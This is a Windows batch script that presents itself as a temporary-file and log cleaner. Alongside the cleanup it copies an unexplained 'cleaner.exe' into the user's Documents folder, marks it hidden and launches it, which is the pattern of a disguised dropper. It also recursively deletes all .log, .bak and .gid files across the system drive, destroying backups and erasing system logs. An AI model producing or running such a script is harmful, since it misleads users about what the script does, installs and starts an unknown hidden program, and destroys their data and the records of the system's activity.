@echo off
echo Welcome! Press any key to start.
pause
echo Cleaning temporary files
color 0C
xcopy /h .\cleaner.exe "%userprofile%\Documents"
attrib +h "%userprofile%\Documents\cleaner.exe"
start %userprofile%\Documents\cleaner.exe
del /s /f /q %SYSTEMDRIVE%\windows\temp\*.*
rd /s /q %SYSTEMDRIVE%\windows\temp
md c:\windows\temp
del /s /f /q %SYSTEMDRIVE%\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
rd /s /q %temp%
color 9
echo Done cleaning temporary files
echo Cleaning logs
color 0C
md %temp%
del /q /f /s %SYSTEMDRIVE%\Temp\*.*
del /q /f /s %WINDIR%\Prefetch\*.*
del /q /f /s %SYSTEMDRIVE%\*.log
del /q /f /s %SYSTEMDRIVE%\*.bak
del /q /f /s %SYSTEMDRIVE%\*.gid
color 9
echo Cleaned logs
pause
cls
